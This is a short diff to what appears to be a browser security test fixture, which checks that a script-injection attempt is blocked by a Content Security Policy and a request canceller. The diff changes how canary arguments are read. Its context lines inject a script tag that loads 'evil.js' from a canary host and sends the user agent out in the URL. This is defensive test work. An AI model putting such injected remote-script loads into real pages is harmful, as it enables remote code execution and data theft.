@@ -5,7 +5,7 @@
      string + remote code load). Blocked by CSP script-src (thing: only) and the
      request canceller. Canary must stay silent. -->
 <script>
-  const canary = (window.bridge.getArgs() || {}).canary || {};
+  const canary = ((window.bridge.getArgs() || {}).args || {}).canary || {};
   const r = { attack: 'script-inject' };
   const s = document.createElement('script');
   s.src = canary.http + '/evil.js?steal=' + encodeURIComponent(navigator.userAgent);
